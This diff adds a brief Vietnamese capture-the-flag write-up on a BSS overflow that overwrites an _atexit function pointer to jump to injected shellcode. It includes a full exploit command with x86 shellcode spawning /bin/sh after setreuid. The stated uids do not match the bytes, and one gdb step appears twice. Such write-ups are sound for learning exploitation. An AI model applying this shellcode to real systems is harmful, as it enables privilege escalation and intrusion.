@@ -1,0 +1,12 @@
+Đây là một bài bss overflow, nhưng nó chả có ý nghĩa gì cả. Biến _atexit chứa địa chỉ một hàm và được gọi lúc sau tương tự với ta ghi đè return address. Ta dùng lỗi buffer overflow ở cp_username để ghi đè lên biến _atexit và nhảy về vùng shellcode của ta ghi ở mảng username.
+
+Dùng gdb tìm địa chỉ của biến username và _atexit, _atexit = username + 512
+
+Dùng gdb tìm địa chỉ của biến username và _atexit, _atexit = username + 512
+
+Viết shellcode gọi setreuid(1210, 1110) và system(“/bin/sh”, 0, 0)
+
+
+./ch7 $(python2 -c "print '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x66\xbb\xb7\x04\x66\xb9\xb7\x04\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80' + 'A' * (512 - 39) + '\x40\xa0\x04\x08'")
+
+
